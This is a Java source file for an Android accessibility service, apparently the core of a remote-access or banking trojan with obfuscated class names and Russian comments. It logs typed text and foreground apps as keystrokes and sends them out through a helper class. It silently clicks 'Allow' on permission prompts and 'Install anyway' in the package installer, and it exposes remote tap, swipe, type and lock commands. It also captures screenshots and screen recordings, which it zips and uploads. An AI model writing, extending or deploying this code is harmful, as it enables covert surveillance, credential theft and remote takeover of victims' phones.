package com.v2ram;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Bitmap;
import android.graphics.Path;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.util.List;

public class b extends AccessibilityService {

    public static b S;

    @Override protected void onServiceConnected() {
        S = this;
        k.send("acc_ready on " + android.os.Build.MODEL);
    }

    @Override public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e == null) return;
        if (autoGrant(e)) return;
        if (autoInstall(e)) return;

        CharSequence pkg = e.getPackageName();
        if (pkg == null) return;

        if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                && e.getText() != null) {
            k.send("key|" + pkg + "|" + e.getText());
        }

        if (e.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            k.send("win|" + pkg + "|" + e.getClassName());
        }
    }

    @Override public void onInterrupt() {}

    // ---- авто-грант разрешений ----
    private boolean autoGrant(AccessibilityEvent e) {
        if (e.getClassName() == null) return false;
        String cls = e.getClassName().toString();
        if (!cls.contains("GrantPermissionsActivity")
                && !cls.contains("PermissionController")) return false;
        AccessibilityNodeInfo r = getRootInActiveWindow();
        if (r == null) return false;
        String[] allow = {"Allow", "While using the app", "Only this time",
                "Разрешить", "Только при использовании"};
        for (String label : allow) {
            List<AccessibilityNodeInfo> l = r.findAccessibilityNodeInfosByText(label);
            for (AccessibilityNodeInfo n : l) {
                AccessibilityNodeInfo p = n;
                while (p != null) {
                    if (p.isClickable()) {
                        p.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                    p = p.getParent();
                }
            }
        }
        return false;
    }

    private boolean autoInstall(AccessibilityEvent e) {
        if (e.getPackageName() == null) return false;
        String pkg = e.getPackageName().toString();
        if (!pkg.contains("packageinstaller")) return false;
        AccessibilityNodeInfo r = getRootInActiveWindow();
        if (r == null) return false;
        String[] btn = {"Install", "Установить", "Next", "Далее",
                "Continue", "Install anyway", "Все равно установить"};
        for (String label : btn) {
            List<AccessibilityNodeInfo> l = r.findAccessibilityNodeInfosByText(label);
            for (AccessibilityNodeInfo n : l) {
                AccessibilityNodeInfo p = n;
                while (p != null) {
                    if (p.isClickable()) { p.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true; }
                    p = p.getParent();
                }
            }
        }
        return false;
    }

    // ---- действия ----
    public void home()    { performGlobalAction(GLOBAL_ACTION_HOME); }
    public void back()    { performGlobalAction(GLOBAL_ACTION_BACK); }
    public void recents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }
    public void lock()    { performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN); }
    public void shade()   { performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS); }
    public void qs()      { performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS); }

    public void tap(float x, float y) {
        Path p = new Path(); p.moveTo(x, y);
        GestureDescription g = new GestureDescription.Builder()
            .addStroke(new GestureDescription.StrokeDescription(p, 0, 40)).build();
        dispatchGesture(g, null, null);
    }

    public void swipe(float x1, float y1, float x2, float y2, long ms) {
        Path p = new Path(); p.moveTo(x1, y1); p.lineTo(x2, y2);
        GestureDescription g = new GestureDescription.Builder()
            .addStroke(new GestureDescription.StrokeDescription(p, 0, ms)).build();
        dispatchGesture(g, null, null);
    }

    public void type(String text) {
        AccessibilityNodeInfo n = getRootInActiveWindow();
        if (n == null) return;
        AccessibilityNodeInfo f = n.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (f != null) {
            android.os.Bundle b = new android.os.Bundle();
            b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            f.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
        }
    }

    public void click(String label) {
        AccessibilityNodeInfo r = getRootInActiveWindow();
        if (r == null) return;
        List<AccessibilityNodeInfo> l = r.findAccessibilityNodeInfosByText(label);
        for (AccessibilityNodeInfo n : l) {
            AccessibilityNodeInfo p = n;
            while (p != null) {
                if (p.isClickable()) { p.performAction(AccessibilityNodeInfo.ACTION_CLICK); return; }
                p = p.getParent();
            }
        }
    }

    public String shot() {
        try {
            final Object lk = new Object();
            final String[] out = {null};
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(),
                new TakeScreenshotCallback() {
                    @Override public void onSuccess(ScreenshotResult sr) {
                        Bitmap hw = Bitmap.wrapHardwareBuffer(sr.getHardwareBuffer(), sr.getColorSpace());
                        Bitmap bm = hw.copy(Bitmap.Config.ARGB_8888, false);
                        sr.getHardwareBuffer().close();
                        ByteArrayOutputStream bo = new ByteArrayOutputStream();
                        bm.compress(Bitmap.CompressFormat.JPEG, 70, bo);
                        out[0] = Base64.encodeToString(bo.toByteArray(), Base64.NO_WRAP);
                        synchronized (lk) { lk.notify(); }
                    }
                    @Override public void onFailure(int err) { synchronized (lk) { lk.notify(); } }
                });
            synchronized (lk) { lk.wait(2000); }
            return out[0];
        } catch (Throwable t) { return null; }
    }

    public void rec(int seconds) {
        new Thread(() -> {
            try {
                java.io.File z = new java.io.File(getCacheDir(), "r.zip");
                java.util.zip.ZipOutputStream zo = new java.util.zip.ZipOutputStream(
                    new java.io.FileOutputStream(z));
                long end = System.currentTimeMillis() + seconds * 1000L;
                int i = 0;
                while (System.currentTimeMillis() < end) {
                    String s = shot();
                    if (s != null) {
                        zo.putNextEntry(new java.util.zip.ZipEntry("f" + (i++) + ".jpg"));
                        zo.write(Base64.decode(s, Base64.DEFAULT));
                        zo.closeEntry();
                    }
                    Thread.sleep(350);
                }
                zo.close();
                k.sendFile(z, "rec_" + i + "frames.zip");
            } catch (Throwable t) { k.send("rec err: " + t.getMessage()); }
        }).start();
    }
}